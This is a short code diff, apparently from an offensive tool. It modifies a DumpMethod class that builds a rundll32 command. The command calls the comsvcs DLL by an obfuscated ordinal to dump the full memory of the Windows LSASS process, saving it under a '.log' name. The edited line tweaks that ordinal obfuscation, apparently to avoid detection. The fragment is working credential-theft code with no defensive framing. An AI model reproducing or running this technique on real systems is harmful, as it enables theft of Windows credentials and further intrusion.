@@ -39,7 +39,7 @@ class DumpMethod(IDumpMethod):
         ]
 
         pwsh_command = [
-            """rundll32.exe C:{}{} `#+0000^24 (Get-Process {}).Id {}{} full""".format(
+            """rundll32.exe C:{}{} `#+000024 (Get-Process {}).Id {}{} full""".format(
                  self.comsvcs_copy_path, self.comsvcs_copy_name, lsass, self.dump_path, self.dump_name + ".log"
             ),
             copy_command
